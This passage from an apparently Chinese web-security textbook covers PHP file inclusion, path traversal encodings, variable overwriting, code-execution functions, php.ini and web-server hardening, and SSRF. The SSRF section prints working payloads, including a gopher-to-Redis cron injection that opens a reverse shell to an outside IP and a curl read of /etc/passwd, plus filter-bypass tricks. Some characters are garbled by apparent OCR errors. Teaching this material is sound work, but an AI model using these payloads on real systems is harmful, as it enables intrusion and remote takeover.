能够打开并包含本地文件的漏洞，被称为本地文件包含漏洞(Local File Inclusion，简称LFI)，比如下面这段代码，就存在LFI漏洞，PHP内核是由C语言实现的，因此使用了C语言中的一些字符串处理函数，在连接字符串时，0字节(\x00)将作为字符串结束符，所以在这个地方，攻击者只要在最后加入一个0字节，就能截断file变量之后的字符串，但这样并没有解决所有问题，国内的安全研究者cloie发现了一个技巧——利用操作系统对目录最大长度的限制，可以不需要0字节而达到截断的目的，目录字符串，在Windows下256字节、Linux下4096字节时会达到最大值，最大值长度之后的字符将被丢弃，除了`indude()`等4个函数外，PHP中能够对文件进行操作的函数都有可能出现漏洞，虽然大多数情况下不能执行PHP代码，但能够读取敏感文件带来的后果也是比较严重的，文件包含漏洞能够读取敏感文件或者服务器端脚本的源代码，从而为攻击者实施进一步攻击奠定基础，在上面的例子中可以看到，使用了`../../../`这样的方式来返回到上层目录中，这种方式又被称为目录遍历(Path Traversal)常见的目录遍历漏洞，还可以通过不同的编码方式来绕过一些服务器端逻辑

- `%2e%2e%2f`等同于`../`
- `%2e%2e/`等同于`../`
- `..%2f`等同于`../`
- `%2e%2e%5c`等同于`„\`
- `%2e%2e\`等同于`..\`
- `..%5c`等同于`..\`
- `%252e%252e%255c`等同于`..\`
- `..%255c`等同于`..\and so on.`

某些Web容器支持的编码方式

- `..%c0%af`等同于`../`
- `..%cl%9c`等同于`..\`

比如CVE-2008-2938，就是一个Tomcat的目录遍历漏洞，如果context.xml或server.xml允许`'allowLinking’`和`'URIencoding'`为`'UTF-8'`，攻击者就可以以Web权限获得重要的系统文件内容，http://www.target.com/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%aeetcpasswd目录遍历漏洞是一种跨越目录读取文件的方法，但当PHP配置了`open_basedir`时，将很好地保护服务器，使得这种攻击无效，`open_basedir`的作用是限制在某个特定目录下PHP能打开的文件，其作用与`safe_mode`是否开启无关，比如在测试环境下，当没有设置`open_basedir`时，文件包含漏洞可以访问任意文件，要解决文件包含漏洞，应该尽量避免包含动态的变量，尤其是用户可以控制的变量，一种变通方式，则是使用枚举，`$file`的值被枚举出来，也就避免了任意文件包含的风险

##### <font color="yellow">0002 远程文件包含</font>

如果PHP的配置选项`allow_url_include`为`ON`的话，则`include/require`函数是可以加载远程文件的，这种漏洞被称为远程文件包含漏洞(Remote File Inclusion，简称RFI)，在变量`$basePath`前没有设置任何障碍，因此攻击者可以构造类似如下的攻击URL，问号后面的代码被解释成URL的querystring，也是一种截断，这是在利用远程文件包含漏洞时的常见技巧同样的，%00也可以用做截断符号

##### <font color="yellow">0003 本地文件包含的利用技巧</font>

本地文件包含漏洞，其实也是有机会执行PHP代码的，这取决于一些条，远程文件包含漏洞之所以能够执行命令，就是因为攻击者能够自定义被包含的文件内容因此本地文件包含漏洞想要执行命令，也需要找到一个攻击者能够控制内容的本地文件，经过不懈的研究，安全研究者总结出了以下几种常见的技巧，用于本地文件包含后执行PHP代码

    * 包含用户上传的文件
    * 包含data://或php://input等伪协议
    * 包含Session文件
    * 包含日志文件，比如Web Server的access log
    * 包含/proc/self/environ文件
    * 包含上传的临时文件(RFC1867)
    * 包含其他应用创建的文件，比如数据库文件、缓存文件、应用日志等，需要具体情况具体分析

包含用户上传的文件很好理解，这也是最简单的一种方法，用户上传的文件内容中如果包含了PHP代码，那么这些代码被`include()`加载后将会执行，但包含用户上传文件能否攻击成功，取决于文件上传功能的设计，比如要求知道用户上传后文件所在的物理路径，有时这个路径很难猜到，文件上传漏洞给出了很多设计安全文件上传功能的建议，伪协议如`php://input`等需要服务器支持，同时要求`allow_url_include`设置为`ON`，在PHP 5.2.0之后的版本中支持data:伪协议，可以很方便地执行代码，它同样要求`allow_url_include`为`ON`，包含日志文件是一种比较通用的技巧，因为服务器一般都会往Web Server的`access_log`里记录客户端的请求信息，在`error_log`里记录出错请求，因此攻击者可以间接地将PHP代码写入到日志文件中，在文件包含时，只需要包含日志文件即可，但需要注意的是，如果网站访问量大的话，日志文件有可能会很大(比如一个日志文件有2GB)，当包含一个这么大的文件时，PHP进程可能会僵死，但Web Server往往会滚动日志，或每天生成一个新的日志文件，因此在凌晨时包含日志文件，将提高攻击的成功性，因为此时的日志文件可能非常小，如果PHP的错误回显没有关闭，那么构造一些异常也许能够暴露出Web目录所在位置，包含`/proc/self/envircm`是一种更为通用的方法，因为它根本不需要猜测被包含文件的路径，同时用户也能控制它的内容，以上这些方法，都要求PHP能够包含这些文件，而这些文件往往都处于Web目录之外，如果PHP配置了`open_basedir`，则很可能会使得攻击失效，但PHP创建的上传临时文件，往往处于PHP允许访问的目录范围内，包含这个临时文件的方法，其理论意义大于实际意义，PHP会为上传文件仓键临时文件，其目录在php.ini的`upload_temp_dir`中定义，但该值默认为空，此时在 Linux下会使用`/tmp`目录，在Windows下会使用`C:\windows\temp`目录，该临时文件的文件名是随机的，攻击者必须准确猜测出该文件名才能成功利用漏洞，PHP在此处并没有使用安全的随机函数，因此使得暴力猜解文件名成为可能，在Windows下，仅有65535种不同的文件名，Gynvael Coldwind深入研究了这个课题，并发表了paper，PHP LFI to arbitratry code execution via rfcl867 file upload temporary files[http://www.exploit-db.com/download_pdf/17010/](http://www.exploit-db.com/download_pdf/17010/)

#### <font color="yellow">003 变量覆盖漏洞</font>

##### <font color="yellow">0001 全局变量覆盖</font>

变量如果未被初始化，且能被用户所控制，那么很可能会导致安全问题，而在PHP中，这种情况在`register_globals`为`ON`时尤其严重，在PHP 4.2.0之后的版本中，`register_globals`默认由`ON`变为了`OFF`，这在当时让很多程序员感到不适应，因为程序员习惯了滥用变量，PHP中使用变量并不需要初始化，因此`register_globals=ON`时，变量来源可能是各个不同的地方，比如页面的表单、Cookie等，回到变量覆盖上来，即便变量经过了初始化，但在PHP中还是有很多方式可能导致变量覆盖，当用户能够控制变量来源时，将造成一些安全隐患，严重的将引起XSS、SQL注入等攻击，或者是代码执行

##### <font color="yellow">0002 `extract()`变量覆盖</font>

`extract()`函数能将变量从数组导入当前的符号表，其中，第一个参数指定函数将变量导入符号表时的行为，最常见的两个值是`EXTR_OVERWRITE和EXTR_SKIP`，当值为`EXTR_OVERWRITE`时，在将变量导入符号表的过程中，如果变量名发生冲突，则覆盖已有变量，值为`EXTR_SKIP`则表示跳过不覆盖，若第二个参数未指定，则在默认情况下使用`EXTR_OVERWRITE`，当`extract()`函数从用户可以控制的数组中导出变量时，可能发生变量覆盖，一种较为安全的做法是确定`register_globals=OFF`后，在调用`extract()`时使用`EXTR_SKIP`保证已有变量不会被覆盖，但`extract()`的来源如果能被用户控制，则仍然是一种非常糟糕的使用习惯，同时还要留意变量获取的顺序，在PHP中是由php.ini中的`variables_order`所定义的顺序来获取变量的，类似`extract()`，下面几种场景也会产生变量覆盖的问题

##### <font color="yellow">0003 遍历初始化变量</font>

常见的一些以遍历的方式释放变量的代码，可能会导致变量覆盖，若提交参数`chs`，则可覆盖变量`$chs`的值，在代码审计时需要注意类似`$$k`的变量赋值方式有可能覆盖已有的变量，从而导致一些不可控制的结果

##### <font color="yellow">0004 `import_request_variables`变量覆盖</font>

`import_request_variables()`将GET、POST、Cookie中的变量导入到全局，使用这个函数只需要简单地指定类型即可，其中第二个参数是为导入的变量添加的前缀，如果没有指定，则将覆盖全局变量

##### <font color="yellow">0005 `parse_str()`变量覆盖</font>

`parse_str()`函数往往被用于解析URL的query string，但是当参数值能被用户控制时，很可能导致变量覆盖，如果指定了`parse_str()`的第二个参数，则会将query string中的变量解析后存入该数组变量中因此在使用`parse_str()`时，应该养成指定第二个参数的好习惯，与`parse_str()`类似的函数还有`mb_parse_str()`

还有一些变量覆盖的方法，难以一次列全，但有以下安全建议

- 确保`register_globals=OFF`，若不能自定义php.ini，则应该在代码中控制
- 熟悉可能造成变量覆盖的函数和方法，检查用户是否能控制变量的来源
- 养成初始化变量的好习惯

#### <font color="yellow">004 代码执行漏洞</font>

PHP中的代码执行情况非常灵活，但究其原因仍然离不开两个关键条件

- 第一是用户能够控制的函数输入
- 第二是存在可以执行代码的危险函数

但PHP代码的执行过程可能是曲折的，有些问题很隐蔽，不易被发现，要找出这些问题，对安全工程师的经验有较高的要求

##### <font color="yellow">0001 危险函数执行代码</font>

文件包含漏洞是可以造成代码执行的，但在PHP中，能够执行代码的方式远不止文件包含漏洞一种，比如危险函数`popen()`、`system()`、`passthru()`、`exec()`等都可以直接执行系统命令，此外，`eval()`函数也可以执行PHP代码，还有一些比较特殊的情况，比如允许用户上传PHP代码，或者是应用写入到服务器的文件内容和文件类型可以由用户控制，都可能导致代码执行，下面通过几个真实案例，来帮助深入理解PHP中可能存在的代码执行漏洞

###### <font color="yellow">a. phpMyAdmin3.4.3.1远程代码执行漏洞</font>

在phpMyAdmin版本3.3.10.2与3.4.3.1以下存在一个变量覆盖漏洞，漏洞编号为CVE-2011-2505，漏洞代码存在于`libraries/auth/swekey/swekey.auth.lib.php`中，但是这个函数的逻辑很短，到最后直接就exit了，原本做不了太多事情，但是注意到Session变量是可以保存在服务器端，并常驻内存的，因此通过覆盖`$_SESSION`变量将改变很多逻辑，原本程序逻辑执行到`session_destroy()`将正常销毁Session，但是在此之前`session_write_close()`已经将Session保存下来，然后到`session_id()`处试图切换Session，这个漏洞导致的后果，就是所有从Session中取出的变量都将变得不再可信任，可能会导致很多XSS、SQL注入等问题，但我们直接看由CVE-2011-2506导致的静态代码注入——在setup/lib/ConfigGenerator.class.php中

###### <font color="yellow">b. MyBB1.4远程代码执行漏洞</font>

接下来看另外一个案例，这是一个间接控制`eval()`函数输入的例子，这是由安全研究者flyh4t发现的一个漏洞，MyBB 1.4 admin remote code execution vulnerability

- 在MyBB的代码中存在`eval()`函数，挖掘漏洞的过程，通常需要先找到危险函数，然后回灌函数的调用过程，最终看在整个调用的过程中用户是否有可能控制输入
- 原来`get()`函数获得的内容是从数据库中取出的

根据该应用的功能，不难看出这完全是用户提交的数据，通过编辑模板功能可以将数据写入数据库，然后通过调用前台文件使得`eval()`得以执行，唯一需要处理的是一些敏感字符，这个案例清晰地展示了如何从找到敏感函数`eval()`到成为一个代码执行漏洞的过程，虽然这个漏洞要求具备应用管理员的身份才能编辑模板，但是攻击者可能会通过XSS或其他手段来完成这一点

##### <font color="yellow">0002 文件写入执行代码</font>

在PHP中对文件的操作一定要谨慎，如果文件操作的内容用户可以控制，则也极容易成为漏洞，下面这个`Discuz! admin\database.inc.php get-webshell`bug由ring04h发现，将控制文件后缀为`.sql`，但是其检查并不充分，攻击者可以利用Apache的文件名解析特性，构造文件名为`081127_k4pFUs3C-l.php.sql`，此文件名在Apache下默认会作为PHP文件解析，从而获得代码执行

##### <font color="yellow">0003 其他执行代码方式</font>

通过上面的几个真实案例，让我们对PHP中代码执行漏洞的复杂性有了初步的了解，如果对常见的代码执行漏洞进行分类，则可以总结出一些规律，熟悉并理解这些可能导致代码执行的情况，对于代码审核及安全方案的设计有着积极意义

1. 直接执行代码的函数

> PHP中有不少可以直接执行代码的函数
> 
> - `eval()`
> - `assert()`
> - `system()`
> - `exec()`
> - `shell_exec()`
> - `passthru()`
> - `escapeshellcmd()`
> - `pcntl_exec()`
> 
> 一般来说，最好在PHP中禁用这些函数，在审计代码时则可以检查代码中是否存在这些函数，然后回溯危险函数的调用过程，看用户是否可以控制输入

2. 文件包含

> 文件包含漏洞也是代码注入的一种，需要高度关注能够包含文件的函数
> 
> - `include()`
> - `include_once()`
> - `requir()`
> - `require_once()`

3. 本地文件写入

> 能够往本地文件里写入内容的函数都需要重点关注
> 
> 这样的函数较多
> 
> - `file_put_contents()`
> - `fwrite()`
> - `fputs()`
> 
> 需要注意的是，写入文件的功能可以和文件包含、危险函数执行等漏洞结合，最终使得原本用户无法控制的输入变成可控，在代码审计时要注意这种组合类漏洞

4. `preg_replace()`代码执行

> `preg_replace()`的第一个参数如果存在`/e`模式修饰符，则允许代码执行，需要注意的是，即便第一个参数中并没有`/e`模式修饰符，也是有可能执行代码的，这要求第一个参数中包含变量，并且用户可控，有可能通过注入`/e%00`的方式截断文本，注入一个`/e`，当`preg_replace()`的第一个参数中包含了`/e`时，用户无论是控制了第二个参数还是第三个参数，都可以导致代码执行

5. 动态函数执行

> 用户自定义的动态函数可以导致代码执行，需要注意这种情况，`create_function()`函数也具备此能力

6. Curly Syntax

> PHP的Curly Syntax也能导致代码执行，它将执行花括号间的代码，并将结果替换回去，`is`命令将列出本地目录的文件，并将结果返回，很多函数都可以执行回调函数，当回调函数用户可控时，将导致代码执行，`ob_start()`实际上也可以执行回调函数，需要特别注意

7. `unserialize()`导致代码执行

> `unserialize()`这个函数也很常见，它能将序列化的数据重新映射为PHP变量，但是`unserialize()`在执行时如果定义了`destruct()`函数，或者是`wakeup()`函数，则这两个函数将执行
> 
> `unserialize()`代码执行有两个条件
> 
> 1. 一是`unserialize()`的参数用户可以控制，这样可以构造出需要反序列化的数据结构
> 2. 二是存在`_destruct()`函数或者`_wakeup()`函数，这两个函数实现的逻辑决定了能执行什么样的代码
> 
> 攻击者可以通过`unserialize()`控制`_destruct()`或`_wakeup()`中函数的输入，攻击payload可以先模仿目标代码的实现过程，然后再通过调用`serialize()`获得，以上为一些主要的导致PHP代码执行的方法，在代码审计时需要重点关注这些地方

#### <font color="yellow">005 定制安全的PHP环境</font>

除了熟悉各种PHP漏洞外，还可以通过配置php.ini来加固PHP的运行环境，PHP官方也曾经多次修改php.ini的默认设置

- `register_globals`

> 当`register_globals=ON`时，PHP不知道变量从何而来，也容易出现一些变量覆盖的问题，因此从最佳实践的角度，强烈建议设置`register_globals=OFF`，这也是PHP新版本中的默认设置

- `open_basedir`

> `open_basedir`可以限制PHP只能操作指定目录下的文件，这在对抗文件包含、目录遍历等攻击时非常有用，我们应该为此选项设置一个值，需要注意的是，如果设置的值是一个指定的目录，则需要在目录最后加上一个`/`，否则会被认为是目录的前缀

- `allow_url_include`

> 为了对抗远程文件包含，请关闭此选项，一般应用也用不到此选项，同时推荐关闭的还有`allow_url_fopen`

- `display_errors`

> 错误回显，一般常用于开发模式，但是很多应用在正式环境中也忘记了关闭此选项，错误回显可以暴露出非常多的敏感信息，为攻击者下一步攻击提供便利，推荐关闭此选项

- `log_errors`

> 在正式环境下用这个就行了，把错误信息记录在日志里，正好可以关闭错误回显

- `magic_quotes_gpc`

> 推荐关闭，它并不值得依赖注入攻击，已知已经有若干种方法可以绕过它，甚至由于它的存在反而衍生出一些新的安全问题，XSS、SQL注入等漏洞，都应该由应用在正确的地方解决，同时关闭它还能提高性能

- `cgi.fix_pathinfo`

> 若PHP以CGI的方式安装，则需要关闭此项，以避免出现文件解析问题

- `session.cookie_httponly`

> 开启HttpOnly

- `session.cookie_secure`

> 若是全站HTTPS则请开启此项

- `safe_mode`

> PHP的安全模式是否应该开启的争议一直比较大，一方面，它会影响很多函数，另一方面，它又不停地被黑客们绕过，因此很难取舍，如果是共享环境(比如App Engine)，则建议开启`safe_mode`，可以和`disable_functions`配合使用，如果是单独的应用环境，则可以考虑关闭它，更多地依赖于`disable_functions`控制运行环境安全，需要特别注意的是，如果开启了`safe_mode`，则`exec()`、`system()`、`passthru()`、`popen()`等函数并非被禁用，而是只能执行在`safe_mode_exec_dir`所指定目录下存在的可执行文件，如果要允许这些函数，则请设置好`safe_mode_exec_dir`的值并将此目录设置为不可写，`safe_mode`被绕过的情况，往往是因为加载了一些非官方的PHP扩展，扩展自带的函数可以绕过`safe_mode`，因此请谨慎加载非默认开启的PHP扩展，除非能确认它们是安全的

- `disable_functions`

> `disable_functions`能够在PHP中禁用函数，这是把双刃剑，禁用函数可能会为开发带来不便，但禁用的函数太少又可能增加开发写出不安全代码的几率，同时为黑客获取webshell提供便利，一般来说，如果是独立的应用环境，则推荐禁用以下函数
> 
> - `disable_functions = escapeshellarg`
> - `escapeshellcmd`
> - `exec`
> - `passthru`
> - `proc_close`
> - `proc_get_status`
> - `proc_open`
> - `proc_nice`
> - `proc_terminate`
> - `shell exec`
> - `system`
> - `ini_restore`
> - `popen`
> - `dl`
> - `disk_free_space`
> - `diskfreespace`
> - `set_time_limit`
> - `tmpfile`
> - `fopen`
> - `readfile`
> - `fpassthru`
> - `fsockopen`
> - `mail`
> - `inialter`
> - `highlight file`
> - `openlog`
> - `show_source`
> - `symlink`
> - `apache_child terminate`
> - `apache_get_modules`
> - `apache_get_version`
> - `apache_getenv`
> - `apache_note`
> - `apache_setenv`
> - `parse_ini_file`
> 
> 如果是共享环境(比如App Engine)，则需要禁用更多的函数，这方面可以参考新浪推出的SAE平台，在共享的PHP环境下，禁用的函数列表如下
> 
> 禁用的函数
> 
> - `php_real_logo_guid`
> - `php_egg_logo_guid`
> - `php_ini_scanned_files`
> - `php_ini_loaded_file`
> - `readlink`
> - `linkinfo`
> - `symlink`
> - `link`
> - `exec`
> - `system`
> - `escapeshellcmd`
> - `escapeshellarg`
> - `passthru`
> - `shell_exec`
> - `proc_open`
> - `proc_close`
> - `proc_terminate`
> - `proc_get_status`
> - `proc_nice`
> - `getmyuid`
> - `getmyinode`
> - `putenv`
> - `getopt`
> - `sys_getloadavg`
> - `getrusage`
> - `get_current_user`
> - `magic_quotes_mntime`
> - `set_magic_quotes_runtime`
> - `import_request_variables`
> - `debug_zval_dump`
> - `ini_alter`
> - `dl`
> - `pclose`
> - `popen`
> - `stream_select`
> - `stream_filter_prepend`
> - `stream_filter_append`
> - `stream_filter_remove`
> - `stream_socket_client`
> - `stream_socketserver`
> - `stream_socketaccept`
> - `stream_socket_get_name`
> - `stream_socke am_socket_shutdown`
> - `stream_socket_pair`
> - `stream_copy_to_stream`
> - `stream_get_contents`
> - `stream_set_write_buffer`
> - `set_file_buffer`
> - `set_socket_blocking`
> - `stream_set_blocking`
> - `socket_set_blocking`
> - `stream_get_meta_data`
> - `streamget_line`
> - `stream_register_wrapper`
> - `stream_wrapper_restore`
> - `stream_get_transports`
> - `stream_is_local`
> - `get_headers`
> - `stream_set_timeout`
> - `socket_get_status`
> - `mail`
> - `openlog`
> - `syslog`
> - `closelog`
> - `apc_add`
> - `apc_cache_info`
> - `apc_clear_cache`
> - `apc_compile_file`
> - `apc_define_constants`
> - `apc_delete`
> - `apc_load_constants`
> - `apc_sma_info`
> - `apc_store`
> - `flock`
> - `pfsockopen`
> - `posix_kill`
> - `apache_child_terminate`
> - `apache_get_modules`
> - `apache_get_version`
> - `apache_getenv`
> - `apache_lookup_uri`
> - `apache_reset_timeout`
> - `apache_response_headers`
> - `apache_setenv`
> - `virtual `
> 
> `_pconnect`禁用的类
> 
> - `XMLWriter`
> - `DOMDocument`
> - `DOMNotation`
> - `DOMXPath`
> - `SQLiteDatabase`
> - `SQLiteResult`
> - `SQLite Unbuffered`
> - `SQLiteException`
> 
> 对于PHP 6来说，安全架构发生了极大的变化，`magic_quotes_gpc`、`safe_mode`等都已经取消，同时提供了一些新的安全功能，由于PHP6离普及尚有很长一段时间，很多功能尚未稳定

#### <font color="yellow">006 总结</font>

> PHP是一门被广泛使用的Web开发语言，它的语法和使用方式非常灵活，这也导致了PHP代码安全评估的难度相对较高

### <font color="yellow">09 Web Server配置安全</font>

#### <font color="yellow">001 Apache安全</font>

Web服务器是Web应用的载体，如果这个载体出现安全问题，那么运行在其中的Web应用程序的安全也无法得到保障，因此Web服务器的安全不容忽视，Web服务器安全，考虑的是应用布署时的运行环境安全，这个运行环境包括Web，Server、脚本语言解释器、中间件等软件，这些软件所提供的一些配置参数，也可以起到安全保护的作用，管近年来Nginx、LightHttpd等Web Server的市场份额增长得很快，但Apache仍然是这个领域中独一无二的巨头，互联网上大多数的Web应用依然跑在Apache Httpd上，先从Apache讲起，因为Apache最具有代表性，其他的Web Server所面临的安全问题也可依此类推，在本章中，Apache均代指Apache Httpd

Web Server的安全我们关注两点

- 一是Web Server本身是否安全
- 二是Web Server是否提供了可使用的安全功能

纵观Apache的漏洞史，它曾经出现过许多次高危漏洞，但这些高危漏洞，大部分是由Apache的Module造成的，Apache核心的高危漏洞几乎没有，Apache有很多官方与非官方的Module，默认启动的Module出现过的高危漏洞非常少，大多数的高危漏洞集中在默认没有安装或enable的Module上，因此，检查Apache安全的第一件事情，就是检查Apache的Module安装情况，根据最小权限原则，应该尽可能地减少不必要的Module，对于要使用的Module，则检查其对应版本是否存在已知的安全漏洞，定制好了Apache的安装包后，接下来需要做的，就是指定Apache进程以单独的用户身份运行，这通常需要为Apache单独建立一个`user/group`，需要注意的是，Apache以root身份或者admin身份运行是一个非常糟糕的决定，这里的admin身份是指服务器管理员在管理机器时使用的身份，这个身份的权限也是比较高的，因为管理员有操作管理脚本、访问配置文件、读/写日志等需求

使用高权限身份运行Apache的结果可能是灾难性的

- 当黑客入侵Web成功时，将直接获得一个高权限(比如root或admin)的shell
- 应用程序本身将具备较高权限，当出现bug时，可能会带来较高风险，比如删除本地重要文件、杀死进程等不可预知的结果

比较好的做法是使用专门的用户身份运行Apache，这个用户身份不应该具备shell，它唯一的作用就是用来运行Web应用，以什么身份启动进程，在使用其他Web容器时也需要注意这个问题，很多JSP网站的管理员喜欢将Tomcat配置为root身份运行，导致的后果就是黑客们通过漏洞得到了webshell后，发现这个webshell已经具备root权限了，Apache还提供了一些配置参数，可以用来优化服务器的性能，提高对抗DDOS攻击的能力，在Apache的官方文档中，对如何使用这些参数给出了指导，[http://httpd.apache.org/docs/trunk/misc/security_tips.html](http://httpd.apache.org/docs/trunk/misc/security_tips.html)，这些参数能够起到一定的作用，但单台机器的性能毕竟有限，所以对抗DDOS不可依赖于这些参数，但聊胜于无，最后，要保护好Apache Log，一般来说，攻击者入侵成功后，要做的第一件事情就是清除入侵痕迹，修改、删除日志文件，因此access log应当妥善保管，比如实时地发送到远程的syslog服务器上

#### <font color="yellow">002 Nginx安全</font>

近年来Nginx发展很快，它的高性能和高并发的处理能力使得用户在Web Server的选择上有了更多的空间，但从安全的角度来看，Nginx近年来出现的影响默认安装版本的高危漏洞却比Apache要多，在Nginx的官方网站有这些安全问题的列表[http://nginx.org/en/security_advisories.html](http://nginx.org/en/security_advisories.html)，因此多多关注Nginx的漏洞信息，并及时将软件升级到安全的版本，是非常有必要的一件事情，从历史的经验来看，如果一个软件出现的漏洞较多，那么说明代码维护者的安全意识与安全经验有所欠缺，同时由于破窗效应，这个软件未来往往会出现更多的漏洞，就软件安全本身来看，Nginx与Apache最大的区别在于，检查Apache安全时更多的要关注Module的安全，而Nginx则需要注意软件本身的安全，及时升级软件版本

与Apache—样，Nginx也应该以单独的身份运行，这是所有Web Server、容器软件应该共同遵守的原则

- Nginx的配置非常灵活，在对抗DDOS和CC攻击方面也能起到一定的缓解作用
- 在Nginx配置中还可以做一些简单的条件判断，比如客户端User-Agent具有什么特征，或者来自某个特定referer、IP等条件，响应动作可以是返回错误号，或进行重定向

在此仍需强调的是，Web Server对于DDOS攻击的防御作用是有限的，对于大规模的拒绝服务攻击，需要使用更加专业的保护方案

#### <font color="yellow">003 jBoos远程命令执行</font>

jBoss是J2EE环境中一个流行的Web容器，但是jBoss在默认安装时提供的一些功能却不太安全，如果配置不得当，则可能直接造成远程命令执行，由于jBoss在默认安装时会有一个管理后台，叫做JMX-Console，它提供给管理员一些强大的功能，其中包括配置MBeans，这同样也会为黑客们打开方便之门，通过8080端又(默认安装时会监听8080端又)访问`/jmx-console`能够进入到这个管理界面，默认安装时访问JMX-Console是没有任何认证的，在JMX-Console中，有多种可以远程执行命令的方法，最简单的方式，是通过DeploymentScanner远程加载一个war包，默认的DeploymentScanner将检查URL是否是`file:/[JBOSSHOME]/server/default/deploy/`，但通过`addURL()`方法却可以添加一个远程的war包，出于安全防御的目的，在加固时，需要删除JMX-Console后台，事实上，jBoss的使用兀全可以不依赖于匕[http://wiki.jboss.org/wiki/Wiki.jsp?passage=SecureTheJmxConsole](http://wiki.jboss.org/wiki/Wiki.jsp?passage=SecureTheJmxConsole)，要移除`JMX-Console`，只需要删除`jmx-console.war`和`web-console.war`即可，它们分别位于`$JBOSS_HOME/server/all/deploy`和`$JBOSS_HOME/server/default/deploy`目录下，如果出于业务需要不得不使用`JMX-Console`，则应该使用一个强壮的密码，并且运行`JMX-Console`的端又不应该面向整个Internet开放

#### <font color="yellow">004 Tomcat远程命令执行</font>

Apache Tomcat与jBoss—样，默认也会运行在8080端口，它提供的Tomcat Manager的作用与JMX-Console类似，管理员也可以在Tomcat Manager中部署war包，但值得庆幸的是，Tomcat Manager布署war包需要有manager权限，而这一权限是在配置文件中定义的，它直接将tomcat用户添加为manager角色，而tomcat用户的密码很可能是一个默认密码，这种配置违背了最小权限原则，虽然Tomcat后台有密码认证，但笔者仍然强烈建议删除这一后台，因为攻击者可以通过暴力破解等方式获取后台的访问权限，从安全的角度看，这增加了系统的攻击面，得不偿失

#### <font color="yellow">005 HTTP Parameter Pollution</font>

Luca、Carettoni等人演示了这种被称为HPP的攻击，简单来说，就是通过GET或POST向服务器发起请求时，提交两个相同的参数，在某些服务端环境中，会只取第一个参数，而在另外一些环境中，比如.net环境中，则会变成，这种特性在绕过一些服务器端的逻辑判断时，会非常有用，这种HPP攻击，与Web服务器环境、服务器端使用的脚本语言有关，HPP本身可以看做服务器端软件的一种功能，参数选择的顺序是由服务器端软件所决定的，但是正如我们在本书中所举的很多例子一样，当程序员不熟悉软件的这种功能时，就有可能造成误用，或者程序逻辑涵盖范围不够全面，从而形成漏洞，HPP这一问题再次提醒我们，设计安全方案必须要熟悉Web技术方方面面的细节，才不至于有所疏漏，从防范上来看，由于HPP是服务器软件的一种功能，所以只需在具体的环境中注意服务器环境的参数取值顺序即可

#### <font color="yellow">006 总结</font>

在搭建服务器端环境时，需要注意最小权限原则，应该以独立的低权限身份运行Web进程，同时Web Server的一些参数能够优化性能，有助于缓解DDOS攻击，在实际运用时可以酌情使用，Web Server本身的漏洞也需要时刻关注，而有些Web容器的默认配置甚至可能还会成为弱点，一名合格的安全工程师应该熟知这些问题

### <font color="yellow">10 服务器端请求伪造(SSRF)</font>

#### <font color="yellow">001 简介</font>

服务端请求伪造(Server Side Request Forgery,SSRF)指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网，SSRF攻击通常针对外部网络无法直接访问的内部系统

漏洞危害

> SSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件，内网服务防御相对外网服务来说一般会较弱，甚至部分内网服务为了运维方便并没有对内网的访问设置权限验证，所以存在SSRF时，通常会造成较大的危害

#### <font color="yellow">002 利用方式</font>

SSRF利用存在多种形式以及不同的场景，针对不同场景可以使用不同的利用和绕过方式，以curl为例，可以使用dict协议操作Redis、file协议读文件、gopher协议反弹Shell等功能，常见的Payload如下

- `curl -vvv 'dict://127.0.0.1:6379/info'`
- `curl -vvv 'file:///etc/passwd'`
- `curl -vvv 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/103.21.140.84/6789 0>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a'`
                
#### <font color="yellow">003 相关危险函数</font>

SSRF涉及到的危险函数主要是网络访问，支持伪协议的网络读取，以PHP为例，涉及到的函数有

- file_get_contents()
- fsockopen()
- curl_exec()

#### <font color="yellow">004 过滤绕过</font>

##### <font color="yellow">0001 更改IP地址写法</font>

一些开发者会通过对传过来的URL参数进行正则匹配的方式来过滤掉内网IP，如采用如下正则表达式

- `^10(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){3}$`
- `^172\.([1][6-9]|[2]\d|3[01])(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$`
- `^192\.168(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$`

对于这种过滤我们采用改编IP的写法的方式进行绕过

例如`192.168.0.1`这个IP地址可以被改写成

- 8进制格式

    `0300.0250.0.1`

- 16进制格式

    `0xC0.0xA8.0.1`

- 10进制整数格式

    `3232235521`

- 16进制整数格式

    `0xC0A80001`

- 合并后两位

    `1.1.278`

    `1.1.755`

- 合并后三位

    `1.278`

    `1.755`

    `3.14159267`

另外IP中的每一位，各个进制可以混用，访问改写后的IP地址时，Apache会报400 Bad Request，但Nginx、MySQL等其他服务仍能正常工作，另外，`0.0.0.0`这个IP可以直接访问到本地，也通常被正则过滤遗漏

##### <font color="yellow">0002 使用解析到内网到域名</font>

如果服务端没有先解析IP再过滤内网地址，我们就可以使用localhost等解析到内网的域名，另外`xip.io`提供了一个方便的服务，这个网站的子域名会解析到对应的IP，例如`192.168.0.1.xip.io`，解析到`192.168.0.1`
    
##### <font color="yellow">0003 利用解析URL所出现的问题</font>

某些情况下，后端程序可能会对访问的URL进行解析，对解析出来的host地址进行过滤，这时候可能会出现对URL参数解析不当，导致可以绕过过滤，比如`http://www.baidu.com@192.168.0.1/`当后端程序通过不正确的正则表达式(比如将http之后到com为止的字符内容，也就是www.baidu.com，认为是访问请求的host地址时)对上述URL的内容进行解析的时候，很有可能会认为访问URL的host为www.baidu.com，而实际上这个URL所请求的内容都是`192.168.0.1`上的内容
    
##### <font color="yellow">0004 利用跳转</font>

